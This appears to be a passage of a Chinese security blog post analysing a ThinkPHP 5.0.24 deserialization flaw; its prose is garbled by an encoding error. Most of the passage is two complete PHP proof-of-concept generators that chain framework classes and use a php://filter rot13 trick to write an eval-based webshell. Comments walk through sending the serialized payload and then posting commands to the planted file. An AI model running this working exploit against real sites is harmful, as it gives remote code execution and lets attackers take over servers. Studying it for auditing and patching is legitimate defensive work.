    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$options</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span><span class="token operator">=</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
http://xxxxx/public/?s=/index/index/test&amp;c=åºåˆ—åŒ–åçš„ç»“æœ
ç„¶åè®¿é—®
http://xxxxx/public/%3C%3Fcuc%20%40riny(%24_CBFG%5B'pzq'%5D)%3B%3F%3E9eb29dfe314054b3d7d41b9c9b3e938c.php
POSTï¼šcmd=phpinfo();
*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¸ºä»€ä¹ˆwindowsè¿˜ä¸è¡Œå‘¢ï¼Œå› ä¸ºwindows<strong>æ–‡ä»¶å</strong>ä¸èƒ½åŒ…å«â€œ&lt;â€ã€â€œ?â€ã€â€œ&gt;â€ç­‰å­—ç¬¦ï¼Œä½†æˆ‘ä»¬åœ¨ä½¿ç”¨ä¼ªåè®®æ—¶ä½¿ç”¨äº†è¿™å‡ ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬æƒ³åœ¨windowsä¸‹åˆ©ç”¨è¿™æ¡popé“¾çš„è¯è¿˜éœ€è¦æƒ³ä¸€äº›å…¶ä»–çš„åŠæ³•ï¼Œæ­¤æ—¶æˆ‘ä»¬å°±éœ€è¦å¯»æ‰¾å…¶ä»–çš„åœ°æ–¹å»èµ‹å€¼æ–‡ä»¶åã€‚</p>
<p>åœ¨è¿™é‡Œæˆ‘ä»¬æ‰¾çš„æ˜¯think\cache\driver\Memcachedçš„set()æ–¹æ³•ï¼Œå³å½“ç¨‹åºèµ°åˆ°Memcache.phpä¸­çš„writeæ–¹æ³•æ—¶æˆ‘ä»¬ä¸ç›´æ¥èµ‹äºˆ$this-&gt;handleä¸ºFileå¯¹è±¡ï¼Œè€Œæ˜¯èµ‹å€¼ä¸ºcacheä¸­çš„Memcachedå¯¹è±¡ã€‚</p>
<h2 id="win-linuxé€šç”¨poc"><a href="#win-linuxé€šç”¨poc" class="headerlink" title="win,linuxé€šç”¨poc"></a>win,linuxé€šç”¨poc</h2><p>Windowsï¼ˆlinuxã€Winé€šç”¨ï¼‰ä¸‹çš„tp5.0ååºåˆ—åŒ–åˆ©ç”¨pocï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
		<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>


<span class="token comment">//tostringæœ¬æ¥æ˜¯è§¦å‘Modelç±»çš„ï¼Œä½†æ˜¯Modelæ˜¯æŠ½è±¡ç±»ï¼Œä¸èƒ½å®ä¾‹åŒ–ã€‚</span>
<span class="token comment">//æ‰€ä»¥ä½¿ç”¨ç»§æ‰¿äº†Modelçš„Pivotç±»</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'getError'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//!</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">BelongsTo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span><span class="token operator">=</span><span class="token constant boolean">false</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span><span class="token operator">=</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$styles</span><span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span>
<span class="token keyword">class</span> <span class="token class-name-definition class-name">File</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'expire'</span>        <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'cache_subdir'</span>  <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'prefix'</span>        <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'data_compress'</span> <span class="token operator">=></span> <span class="token constant boolean">false</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'path'</span>          <span class="token operator">=></span> <span class="token string single-quoted-string">'php://filter/write=string.rot13/resource=./'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
 
<span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>
 
    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>
            <span class="token string single-quoted-string">'expire'</span>   <span class="token operator">=></span> <span class="token number">0</span><span class="token punctuation">,</span>
            <span class="token string single-quoted-string">'prefix'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'&lt;?cuc @riny($_CBFG[\'pzq\']);?>'</span><span class="token punctuation">,</span>
        <span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span>
<span class="token variable">$windows</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$windows</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*
http://xxxxx/public/?s=/index/index/test&amp;c=åºåˆ—åŒ–åçš„ç»“æœ
ç„¶åè®¿é—®
http://xxxxx/public/0f3a97a39ce7ab0b6672494aace6b06a.php
POSTï¼šcmd=phpinfo();
*/</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<p>å­¦ä¹ é“¾æ¥ï¼š</p>
<ul>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Yhck/p/15616884.html">Thinkphp5.0.24ååºåˆ—åŒ–æ¼æ´åˆ†æä¸åˆ©ç”¨ - Yhck - åšå®¢å›­ (cnblogs.com)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/xiaozhiru/p/12452528.html">ThinkPHP 5.0.24 ååºåˆ—åŒ–RCE ï¼ˆWindowsä¸‹EXPï¼‰ - xiaozhiru - åšå®¢å›­ (cnblogs.com)</a></p>
</li>
<li><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/263746.html">Thinkphp5.0ã€5.1ã€6.xååºåˆ—åŒ–æ¼æ´åˆ†æåŠEXP - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p>
</li>
</ul>
<hr>

  <p><a class="classtest-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">ä»£ç å®¡è®¡</a> â€” 2022å¹´9æœˆ20æ—¥</p>
  


        </div>
        <div class="row mt-2">
  <h3>Search</h3>
  <div><input id="search-text" title="search" class="search-text" type="text" placeholder="search......"></div>
  <div style="margin-top: 1.5rem;">
    <ul id="result"></ul>
  </div>
</div>
        <div class="row mt-2">
  
    <div class="eight columns">
      <p id="madewith">Made with â¤ and
        <a class="footer-link icon" href="https://hexo.io" target="_blank" style="text-decoration: none;" rel="noreferrer" aria-label="Hexo.io">
        <svg class="hexo svg-hov" width="14" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><title>Hexo.js</title><path d="M12 .007L1.57 6.056V18.05L12 23.995l10.43-6.049V5.952L12 .007zm4.798 17.105l-.939.521-.939-.521V12.94H9.08v4.172l-.94.521-.938-.521V6.89l.939-.521.939.521v4.172h5.84V6.89l.94-.521.938.521v10.222z"/></svg>
        </a>
        
    </div>

    <!-- Sepcial thanks to https://simpleicons.org/ for the icons -->
    <div class="four columns mb-3 posisi" >
      
      <a class="ml-0 footer-link icon" href="https://github.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="GitHub">
        <svg class="github svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
      </a>
      

      

      
      <a class="ml-0 footer-link icon" href="https://twitter.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Twitter">
        <svg class="twitter svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Twitter</title><path d="M23.954 4.569c-.885.389-1.83.654-2.825.775 1.014-.611 1.794-1.574 2.163-2.723-.951.555-2.005.959-3.127 1.184-.896-.959-2.173-1.559-3.591-1.559-2.717 0-4.92 2.203-4.92 4.917 0 .39.045.765.127 1.124C7.691 8.094 4.066 6.13 1.64 3.161c-.427.722-.666 1.561-.666 2.475 0 1.71.87 3.213 2.188 4.096-.807-.026-1.566-.248-2.228-.616v.061c0 2.385 1.693 4.374 3.946 4.827-.413.111-.849.171-1.296.171-.314 0-.615-.03-.916-.086.631 1.953 2.445 3.377 4.604 3.417-1.68 1.319-3.809 2.105-6.102 2.105-.39 0-.779-.023-1.17-.067 2.189 1.394 4.768 2.209 7.557 2.209 9.054 0 13.999-7.496 13.999-13.986 0-.209 0-.42-.015-.63.961-.689 1.8-1.56 2.46-2.548l-.047-.02z"/></svg>
      </a>
      

      
      <a class="ml-0 footer-link icon" href="https://instagram.com/" target="_blank" style="text-decoration: none" rel="noreferrer" aria-label="Instagram">
        <svg class="instagram svg-hov" width="18" role="img" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg"><title>Instagram</title><path d="M12 0C8.74 0 8.333.015 7.053.072 5.775.132 4.905.333 4.14.63c-.789.306-1.459.717-2.126 1.384S.935 3.35.63 4.14C.333 4.905.131 5.775.072 7.053.012 8.333 0 8.74 0 12s.015 3.667.072 4.947c.06 1.277.261 2.148.558 2.913.306.788.717 1.459 1.384 2.126.667.666 1.336 1.079 2.126 1.384.766.296 1.636.499 2.913.558C8.333 23.988 8.74 24 12 24s3.667-.015 4.947-.072c1.277-.06 2.148-.262 2.913-.558.788-.306 1.459-.718 2.126-1.384.666-.667 1.079-1.335 1.384-2.126.296-.765.499-1.636.558-2.913.06-1.28.072-1.687.072-4.947s-.015-3.667-.072-4.947c-.06-1.277-.262-2.149-.558-2.913-.306-.789-.718-1.459-1.384-2.126C21.319 1.347 20.651.935 19.86.63c-.765-.297-1.636-.499-2.913-.558C15.667.012 15.26 0 12 0zm0 2.16c3.203 0 3.585.016 4.85.071 1.17.055 1.805.249 2.227.415.562.217.96.477 1.382.896.419.42.679.819.896 1.381.164.422.36 1.057.413 2.227.057 1.266.07 1.646.07 4.85s-.015 3.585-.074 4.85c-.061 1.17-.256 1.805-.421 2.227-.224.562-.479.96-.899 1.382-.419.419-.824.679-1.38.896-.42.164-1.065.36-2.235.413-1.274.057-1.649.07-4.859.07-3.211 0-3.586-.015-4.859-.074-1.171-.061-1.816-.256-2.236-.421-.569-.224-.96-.479-1.379-.899-.421-.419-.69-.824-.9-1.38-.165-.42-.359-1.065-.42-2.235-.045-1.26-.061-1.649-.061-4.844 0-3.196.016-3.586.061-4.861.061-1.17.255-1.814.42-2.234.21-.57.479-.96.9-1.381.419-.419.81-.689 1.379-.898.42-.166 1.051-.361 2.221-.421 1.275-.045 1.65-.06 4.859-.06l.045.03zm0 3.678c-3.405 0-6.162 2.76-6.162 6.162 0 3.405 2.76 6.162 6.162 6.162 3.405 0 6.162-2.76 6.162-6.162 0-3.405-2.76-6.162-6.162-6.162zM12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm7.846-10.405c0 .795-.646 1.44-1.44 1.44-.795 0-1.44-.646-1.44-1.44 0-.794.646-1.439 1.44-1.439.793-.001 1.44.645 1.44 1.439z"/></svg>
      </a>
      

      

    </div>
  
</div>
<script src="/js/prism/prism.js" async></script>
      </div>

    </div>

  </div>
  <script src="/js/nanobar.min.js"></script>

  <script>
